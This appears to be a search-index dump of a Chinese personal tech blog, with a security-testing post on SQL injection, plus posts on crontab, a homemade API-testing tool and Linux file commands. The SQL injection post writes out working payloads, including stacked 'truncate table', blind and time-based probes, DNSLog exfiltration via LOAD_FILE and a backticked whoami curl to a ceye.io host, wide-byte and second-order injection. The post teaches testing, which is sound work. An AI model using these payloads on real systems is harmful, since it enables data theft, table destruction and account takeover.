[{"categories":null,"content":"什么是SQL注入 在没有对没有对输入参数进行校验的情况下，请求方可以向参数中添加一些影响SQL的字符，导致程序直接用请求者传入的参数去数据库查询，会导致原有的SQL被修改，不能按预期返回 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:1:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"SQL注入示例 比如一个查询接口，查询指定时间段内的数据 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2020-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01' LIMIT 0,30; 如果没有对输入参数做校验，前端传入了截断字符串的参数，那SQL就变成了下面这样 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2000-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01';#') LIMIT 0,30; 上面的查询直接查询了很长一段时间范围内的数据，如果数据量非常大的话，会对数据库造成较大压力 或者 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2000-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01'; select table_name from information_schema.tables;#') LIMIT 0,30; 上面的操作就获取到了所有表名称 如果业务登录的用户权限够大的话，然后就可以这样 SELECT * FROM STAPP WHERE TC_OD_OPT_DT \u003e '2000-11-16 15:05:01' AND TC_OD_OPT_DT \u003c '2020-11-18 15:05:01'; truncate table STAPP;#') LIMIT 0,30; 上面的操作会清空整张STAPP表 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:2:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"注入点 文本框注入 常见的用户名文本输入框，密码文本输入框，查询文本输入框 url注入 针对连接后面的参数进行测试，比如在网站上点击一篇文章，网站前端会把文章的ID放到url中发送GET请求到服务端 如：https://www.jianshu.com/p/178ca3ddc866，可以对最后面的文章id进行注入测试 工具 spider：可以获取到一个网址的所有链接 sqlmap：开源渗透测试工具，能自动检测利用SQL注入缺陷并接管数据库服务器 sqlmap使用方法： sqlmap -u \"url\"：检测注入点，url中必须有例如id=123类似的参数 sqlmap -l：从Burpsuite proxy或WebScarab proxy中读取http请求日志文件 sqlmap -x：从sitemap.xml站点地图文件中读取目标检测 sqlmap -m：从多行文本格式文件读取多个目标，对多个目标进行探测 sqlmap -r：从Burp suite保存的文本文件中读取http请求作为注入探测的目标 sqlmap -c：从配置文件sqlmap.conf中读取目标探测 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:3:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"注入方法 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:0","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"布尔盲注 可以进行注入，但是不能通过注入直接拿到数据库中的数据 func SelectUser(db *sql.DB, name string) bool { rows, err := db.Query(`SELECT u.\"name\" FROM \"user\" u WHERE u.\"name\" = $1`,name) ifErr(err) user := User{} for rows.Next() { err := rows.Scan(\u0026user.Name) ifErr(err) if user.Name == \"\"{ return false }else { return true } } } 如果上面代码中的db.Query方法没有对传入的name参数做校验的话，那么该程序是存在注入漏洞的 虽然没有返回查询数据与错误信息，但是返回了查询结果 如果正常查询操作，会返回正常的结果 SelectUser(db,\"test\")//查询到test则返回true，否则返回false 如果传入一个非法参数，如下所示 SelectUser(db,\"test'\") 上面传入的name参数为test的值存在，当在后面输入一个截断的单引号时，该sql会执行失败，会返回false 这样就成功的测试出了该参数是存在注入漏洞的 通过这个漏洞可以对请求参数后添加一些其他的语句，对请求的内容做出判断，如果返回true那么我们的判断则是正确的，否则是错误的 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:1","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"时间盲注 当存在注入漏洞的查询接口，无论有没有查询到数据，都返回相同的值时，可以构造sql语句，通过相应时间来判断盲注的成功与否 示例： 编写逻辑sql，通过条件语句进行判断，为真则立即执行，否则延时执行。语法为： if(left(user(),1)='a',0,sleep(3)); 如果left(user(),1)='a'判断为真，则返回0，如果判断为假，则执行sleep(3) ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:2","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"mysql中盲注的一些方法 left()函数： select left(database(),1) = 's' database显示数据库名称，left函数从左截取数据库名称的前N位 regexp select user() regexp '^r' 正则表达式的用法，与left()用法相似，也是从左往右匹配，当匹配成功时则返回1 substr函数：用来截取字符串 SELECT SUBSTR((SELECT DATABASE()),1，1) //截取查询结果的第一位 ascii函数：可以将字符串转换为ascii码值，该方法可以避免单引号的出现，能适用于更多的场景 select ascii(SUBSTR((SELECT database()),1,1)) 通过以上方法可以进行盲注测试 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:3","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"DnsLog盲注 当程序存在注入漏洞，但是既不会返回查询结果，又不会返回错误信息时，可以通过布尔盲注和时间盲注通过猜测注入的方式获取到数据，但是这个过程效率很低，要发起很多请求。 所以需要一种方式，减少请求，直接返回查询结果，这里可以使用DnsLog实现注入 DnsLog盲注原理 DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息 DNS的日志信息 curl xx.r4ourp.ceye.io 记录信息 详情 地址 方式 user-agent HTTP Request http://xx.r5ourp.ceye.io/ 10.10.10.10 GET curl/7.3.0 DNS Query xx.r5ourp.ceye.io 10.10.10.10 curl `whoami`.r4ourp.ceye.io 记录信息 详情 地址 方式 user-agent HTTP Request http://test.r5ourp.ceye.io/ 10.10.10.10 GET curl/7.3.0 DNS Query test.r5ourp.ceye.io 10.10.10.10 上面使用反引号包起来的whoami被拿到服务器的终端去执行了，然后返回的结果放到了whoami的位置 白话就是，被反引号包起来的被当做命令拿到服务器的终端去执行了，返回的结果被记录到了DNS的日志信息里面 mysql的load_file() 在mysql中，load_file函数可以发起请求，可以利用该函数发起请求，使用DnsLog接收请求，获取数据 语法：SELECT LOAD_FILE(CONCAT('\\\\\\',(SELECT DATABASE()),'.MYSQL.r4ourp.ceye.io\\\\abc')); 通过SQL语句查询内容，作为请求的一部分，发送至DnsLog 只要对这部分的语句进行构造，就能实现有回显的注入 但是对数据格式和内容有限制，只能写入指定的内容 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:4","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"宽字节注入 什么是宽字节 长度为一个字节的字符是窄字节，长度是两个字节的字符为窄字节 当程序对入参做过简单判断时，比如说将单引号转义成\\'，而当mysql在使用GBK编码时，会认为两个字符为一个汉字 输入 处理 编码 转义 SQL %df' %df\\' %df%5C%27 運' id=運' and 这样就可以成功注入了 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:5","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"二次编码注入 当经过多次编码后的参数仍不符合要求是，即可造成sql注入 例如：id=1%2527 1.上面的id参数值在PHP自身编码中会被识别为1%27 2.然后对1%27进行非法字符的转义，因为没有非法字符，所以直接跳过 3.此时如果程序中编写的代码对参数进行了转换的话，1%27就变成了1' 此时1’被传入到数据库中是可以将sql截断的 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:6","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"二次注入 原理 1.在传入的参数中插入恶意字符，比如单引号，程序传输过程中对单引号进行了转义，但入库时仍会把原有数据入库 2.将数据存入到了数据库中之后，程序就认为该数据是安全的，下一次需要进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检查和处理，这样就会造成二次注入 例子 假如该系统的数据库为mysql 1.先注册一个用户，用户名为admin 2.再注册一个用户，用户名为admin'# 3.然后修改admin'#用户的密码 当修改admin'#的时候就会产生SQL注入： update users set passwd = 'newPassword' where username = 'admin'#' and passwd = 'oldPassword' 可以看到上面的sql如果没有对admin'#做校验的话，那么就会成功注入，最终执行的sql为 update users set passwd = 'newPassword' where username = 'admin' 这样就成功的把admin用户的密码修改掉了 如果没有对用户名的入参做校验的话，甚至可以在用户名后输入一些sql语句来获取数据库的一些信息，或者进行删除操作 这种场景会有很多，不只是只有登录场景存在，所以测试时要考虑的足够全面 ","date":"2021-04-29","objectID":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/:4:7","tags":["安全测试"],"title":"安全测试之-SQL注入","uri":"/posts/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E4%B9%8B-sql%E6%B3%A8%E5%85%A5/"},{"categories":["linux"],"content":"介绍 crontab在Linux系统中用于执行定时任务，比如服务巡检，日志备份清理，数据库备份 在Centos7中，最小安装会有该服务，进程名是crond Crontab的任务管理在/etc目录下的crontab文件中 ","date":"2021-04-18","objectID":"/posts/crontab/:1:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"crontab文件详解 1./var/spool/cron/：该目录存放着每个用户设置的任务，文件以用户名命名 2./var/log/cron：该文件是crontab的日志文件，当任务执行没有成功时可以查看该日志排查 3./etc/crontab： 该文件用来管理定时任务，默认有root用户可以编辑可以修改权限给其他用户编辑，但是刷新配置时依然只能root用户来刷新，而且该任务只属于root用户 SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root # For details see man 4 crontabs # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed ","date":"2021-04-18","objectID":"/posts/crontab/:2:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"顶部环境相关部分 SHELL=/bin/bash：表示使用/bin/bash解释命令 PATH=/sbin:/bin:/usr/sbin:/usr/bin：表示到哪些目录寻找命令执行程序 MAILTO：当有任务执行有输出时，输出内容将发送到那个用户的邮箱，为空则不发送 ","date":"2021-04-18","objectID":"/posts/crontab/:2:1","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"底部定时任务配置部分 下面是整个文件的核心部分 # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 时间部分 * * * * *表示的是时间配置 第一个*表示分钟，取值范围在0~59之间的整数 第二个*表示小时，取值范围在0~23之间的整数 第三个*表示日期，根据下面指定月份中的天数取值 第四个*表示月份，取值范围在1~12之间的整数 第五个*表示星期，取值范围在1~7之间的整数 特殊符号： *：代表规则范围内的任意值，如果设置该值的是分钟，则在满足其他条件下的情况下，每分钟都会执行 ,：将指定的值隔开，如在分钟中使用，1,18,23，在满足其他条件情况下，在1、18、23分钟是都会执行 -：用于指定取值范围，如在分钟中使用，1-5，则表示的是1、2、3、4、5分钟 /：用于指定时间的执行频率，如在分钟中使用，0-30/2，则表示的是在30分钟之内，每隔两分钟执行一次 时间配置验证 https://crontab.guru/ 上面网址会对配置的时间验证 命令部分 user-name command to be executed表示的是用户和执行的命令 因为环境变量的原因，可能有很多在终端执行的命令，放到crontab里面执行不了，所以最好写绝对路径 环境变量的问题下面会详细写下，现在先写一个例子 # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed */2 * * * * /usr/sbin/ntpdate s1a.time.edu.cn 上面的例子是每两分钟同步一次s1a.time.edu.cn的时间 ","date":"2021-04-18","objectID":"/posts/crontab/:2:2","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"crontab的环境变量 crontab默认不会加载用户和系统设置的环境变量，所以一些命令在终端可以执行但是在crontab执行不了 解决方法 1.在crontab添加任务时写绝对路径 2.把刷新环境变量的命令添加到crontab中，只适用于root用户 3.可以在对应的任务之前添加一段使系统环境变量生效的命令 4.可以把要执行的文件所在目录添加到PATH中 ","date":"2021-04-18","objectID":"/posts/crontab/:3:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["linux"],"content":"crontab相关命令 crontab -l：列出当前用户的所有任务 crontab -e：编辑当前用户的任务，上面说普通用户没有办法把任务加到/etc/crontab中，但是可以使用这条命令添加属于自己的任务，格式与/etc/crontab相同 crontab /etc/crontab：用于root用户编辑完/etc/crontab后刷新任务列表 crontab -r：删除当前用户的所有任务，注意是删除所有，慎用 ","date":"2021-04-18","objectID":"/posts/crontab/:4:0","tags":["linux"],"title":"crontab","uri":"/posts/crontab/"},{"categories":["接口测试"],"content":"支持的请求方式 支持GET请求 支持POST请求 ","date":"2021-04-17","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/:1:0","tags":["接口测试"],"title":"接口测试小工具文档","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/"},{"categories":["接口测试"],"content":"支持的请求体类型 支持json格式 支持multipart/form-data格式 ","date":"2021-04-17","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/:2:0","tags":["接口测试"],"title":"接口测试小工具文档","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/"},{"categories":["接口测试"],"content":"返回值相关 支持返回值拼接，在respParams参数中写入GET和SET的kay，使用方式见下面参数解释 2021.04.15 ","date":"2021-04-17","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/:3:0","tags":["接口测试"],"title":"接口测试小工具文档","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/"},{"categories":["接口测试"],"content":"配置文件 case1:'{ \"method\":\"POST\", \"header\":{ \"content-Type\":\"application/json\", \"Authorization\":\"Bearer d15a43e2-ade8-4566-95b6-b3f7e7821d63\" }, \"bodyType\":\"multipart/form-data\", \"body\":{ \"sourceSystem\": \"corex\", \"stAppno\": \"200000030139\", \"stGrpNo\": \"2\", \"rpFindings\": \"test1\", \"rpInspectCon\": \"test结论\", \"osrContent\": \"\", \"rpKeyword\": \"\", \"rpChkUserId\": \"manager\", \"rpChkUsername\": \"管理员\", \"rpChkDt\": \"2020-07-01T18:42:40.000\", \"rpPositivePpt\": \"\", \"rpCriticalGrade\": \"\", \"tisID\": \"df319296aa714e4dafef813781f6b7a1\" }, \"files\":{ \"file\":\"C:/Users/rui/Pictures/Saved Pictures/test.png\", \"file1\":\"C:/Users/rui/Pictures/Saved Pictures/test.png\" }, \"respParams\":{ \"data,token_type\u0026data,access_token\":\"case3,header,Authorization\" }, \"\" }' method：参数值：GET、POST header：键值对 bodyType：参数值： urlParams：如果是URL上的参数写到body中的时候，bodyType需要写入该值 json：json形式的请求体 multipart/form-data：表单格式的请求体 body：键值对，支持嵌套 GET：url上的键值对可以写到body上，不能嵌套 POST：支持嵌套的json类型 表单格式：键值对的参数可以写到body上，如果有文件上传，写到下面的files files：键为文件的key，值为文件地址，可以写多个键值对，不能嵌套 response：将json返回值的参数取出，写入到其它case的参数中 一个参数对应一个参数，取data,token_type中的参数放到case3,header,Authorization中 response:{ \"data,token_type\":\"case3,header,Authorization\" } 多个参数对应一个参数，取data,token_type和data,access_token中的值拼接起来放到case3,header,Authorization中 response:{ \"data,token_type\u0026data,access_token\":\"case3,header,Authorization\" } ","date":"2021-04-17","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/:4:0","tags":["接口测试"],"title":"接口测试小工具文档","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B0%8F%E5%B7%A5%E5%85%B7%E6%96%87%E6%A1%A3/"},{"categories":null,"content":" 开篇啰嗦 这篇废话太多了，写的也太乱了，做完了新开一篇总结的 之前也写过接口测试工具，不过测试数据是放到Excel里面维护的 前段时间和两个测试大佬聊，他们好像不太看好把测试数据维护到Excel里面 所以现在利用业余时间重新做一个，把数据放到配置文件里面 思路和过程还有进度就展示在这里了 啥时候有雏形的时候就放到github上去 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:0:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"2021.04.17 12:40更新 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:1:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"已经完成的 2021.04.17 12:40 1.读取配置文件 2.发送请求 3.把指定的返回值拼接到指定的KEY上 2021.04.24 4.对指定的返回值做判断 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:2:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"下一步的计划 2021.04.17 12:40 1.对指定的返回值做判断 2.写一个日志模块 3.把case的val换成yaml格式的（这周看到了一个yaml的详细教程，不是不好解析，而是我不会😓） ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:3:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"Github地址 https://github.com/ongrui/code200 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:4:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"2021.04.10 23:38 周五开始做的，目前先把配置文件的思路讲一下 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:5:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"配置文件 接口地址放到一个yaml文件中，每个接口的case放到一个yaml文件中 URL存放的配置文件 conn.yaml url:- url:http://127.0.0.1/corexapi/oauth/tokencase:case1,case2- url:http://127.0.0.1/corexapi/external/pacs/cancelRegistercase:case3,case4 url：要测试的接口地址 case：每个URL要执行的case，可以是多个值，对应下面的case.yaml的第一个key case存放的配置文件 case.yaml case1:method:GETheader:Content-Type:application/jsonbodyType:paramsbody:test:1token:respParame:data,access_token:case2,header,tokencase2:method:POSTheader:jsonContent-Type:application/jsontoken:bodyType:body:test:respParame: method：请求方式 header：请求头，下面是请求头的内容，成对写入 bodyType：body类型 body：body内容 respParame：目的是把返回值中想要的参数拼接到其它case上 data,access_token：为返回参数的key，要支持嵌套结构，比如下面的例子，token在data一层里面的时候，也可以获取到 case2,header,token：取到想要的参数后，把该参数拼接到的地方 { \"success\":true, \"code\":200, \"msg\":\"请求成功\", \"data\":{ \"access_token\":\"96c0549c-f56c-4991-b351-8dad3adb40c2\", \"token_type\":\"bearer\", \"refresh_token\":\"de2ee487-6036-4770-a0a0-898086199157\", \"expires_in\":86399, \"scope\":\"read write\" } } ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:5:1","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"工作流程 先读取conn.yaml，然后去遍历对应的case，拿到请求后调用请求方法，把请求对象传进去，然后再对返回值做处理 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:5:2","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"2021.04.12 20:22 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:6:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"今日工作汇报 领导把我薅到济南分部来了，今天跟领导沟通了挺多关于服务端质量保障体系相关的东西 在这边儿倒是停清闲，不过宾馆桌子太小了，还没插座😭，明天在公司多呆会儿 嘿嘿，可以没有鼠标，但是不能没有键盘 废话不说了，汇报工作正式开始 修改yaml配置文件 1.我把case的val改成了json形式的，yaml不好解析，改完就是下面这样 case1:'{ \"method\":\"POST\", \"header\":{ \"content-Type\":\"application/json\" }, \"bodyType\":\"form-data\", \"body\":{ \"sourceSystem\": \"corex\", \"stAppno\": \"0xx83hd8j3972\", \"stGrpNo\": \"2\", \"rpFindings\": \"测试所见\", \"rpInspectCon\": \"测试结论\", \"osrContent\": \"\", \"rpKeyword\": \"\", \"rpChkUserId\": \"manager\", \"rpChkUsername\": \"管理员\", \"rpChkDt\": \"2021-01-01T18:42:40.000\", \"rpPositivePpt\": \"\", \"rpCriticalGrade\": \"\", \"tisID\": \"df3192o4icu14e4daf9jf83781f6b7a1\" }, \"files\":{ \"file\":\"test.png\", \"filePath\":\"../files/test.png\" } }' 配置文件读取相关代码 2.今天把读取配置文件的写完了，贴个图吧，写的太烂，面向struct编程理解的太浅（看图得新建个标签页😂） ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:6:1","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":null,"content":"2021.04.17 16:01 完成了读取配置文件的业务、请求业务，还可以将json格式的response中指定KEY的值写入到其它的请求体或者请求头里面去 这周看到了一篇关于YAML的详细文档，发现也很好解析，当时只是我自己菜，没有去网上仔细搜下😥，回头再改回yaml格式的​ 我的垃圾代码已经提交到了github上了，算是做个记录吧https://github.com/ongrui/code200 还有关于文章的 图片可以放大了，把文章头部预览去掉了 ","date":"2021-04-11","objectID":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/:7:0","tags":["接口测试"],"title":"接口测试小工具","uri":"/posts/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"categories":["linux"],"content":"开篇啰嗦 啥时候更新时间间隔超过三个月我就把持续更新去掉 话说作为一个测试，第一篇文章是不是应该得是测试相关的 唉，在公司学的最多的就是linux 先写这个吧，明天再写一篇测试相关的 下面都是我目前能想到或工作中常用的 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:0:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件操作相关 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件拷贝 cp 拷贝文件：cp 要拷贝的文件 目标路径 拷贝文件redis.conf到/etc/目录下 [root@rui redis-6.2.0]# cp redis.conf /etc/ [root@rui redis-6.2.0]# ls /etc/redis.conf /etc/redis.conf 拷贝文件夹：cp -r 要拷贝的文件夹 目标路径 拷贝文件夹redis-6.2.0到/usr/local/目录下 [root@rui home]# cp -r redis-6.2.0/ /usr/local/ [root@rui home]# ls /usr/local/ bin games lib libexec redis-6.2.0 share etc include lib64 proc sbin src ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件移动 mv 移动文件夹/文件：mv 要移动的文件夹或者是文件 目标路径 移动文件redis.conf到src目录下 [root@rui redis-6.2.0]# mv redis.conf src/ [root@rui redis-6.2.0]# ls src/redis.conf src/redis.conf ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"文件查找 方式一：find 要查找的路径 -name 要查找的文件 find会遍历指定路径下的所有文件，然后返回符合条件的，支持模糊查询 [root@rui redis-6.2.0]# find ./ -name redis.c* ./src/redis.conf 方式二：locate 要查找的文件 locate 在/var/lib/mlocate/目录下存放着一个数据库文件，其实使用locate查询是查询的数据库，所以locate非常快 locate会返回所有包含文件名的文件 [root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/red /home/redis-6.2.0/src/redis-benchmark /home/redis-6.2.0/src/redis-benchmark.c /home/redis-6.2.0/src/redis-benchmark.d /home/redis-6.2.0/src/redis-benchmark.o /home/redis-6.2.0/src/redis-check-aof /home/redis-6.2.0/src/redis-check-aof.c /home/redis-6.2.0/src/redis-check-aof.d 